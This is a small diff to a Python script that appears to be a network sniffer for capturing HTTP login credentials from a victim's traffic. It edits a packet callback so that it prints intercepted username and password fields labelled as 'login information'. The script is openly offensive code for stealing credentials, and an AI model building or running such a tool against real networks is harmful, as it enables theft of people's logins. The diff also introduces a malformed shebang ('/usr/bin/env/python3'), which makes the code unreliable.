@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env/python3
 import os
 import time
 import logging
@@ -19,7 +19,7 @@ def packet_callback(packet):
 			# print("index1 = {}, index2 = {}".format(index1, index2))
 			if pkt.find(tok1) != -1:
 				print("\n{} ----HTTP----> {}:{}".format(packet[IP].src, packet[IP].dst, packet[IP].dport))
-				print(pkt[index1:index3]+"  "+pkt[index2:index4])
+				print("Read login information:\n("+pkt[index1:index3]+", "+pkt[index2:index4]+")")
 
 def getInfo(victimIP):
 	print("~~~Getting addresses...")
